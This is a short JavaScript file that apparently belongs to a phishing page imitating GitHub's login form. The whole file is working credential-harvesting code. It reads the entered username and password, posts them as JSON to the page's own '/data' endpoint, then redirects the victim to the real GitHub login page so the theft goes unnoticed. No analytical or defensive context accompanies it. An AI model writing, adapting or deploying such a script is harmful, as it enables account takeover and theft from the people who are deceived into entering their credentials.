async function submitHandler(e) {
  e.preventDefault();
  const username = document.getElementById('login_field').value;
  const password = document.getElementById('password').value;
  const data = JSON.stringify({ username, password });
  const reqOptions = {
    method: 'post',
    headers: {
      'Accept': 'application/json',
      'Content-Type': 'application/json'
    },
    body: data,
  }

  await fetch('/data', reqOptions);

  window.location.href = `https://github.com/login?login=${username}`;
}

function init() {
  submitBtn = document.getElementById('submit');
  submitBtn.addEventListener('click', submitHandler);
}

window.addEventListener('load', init);
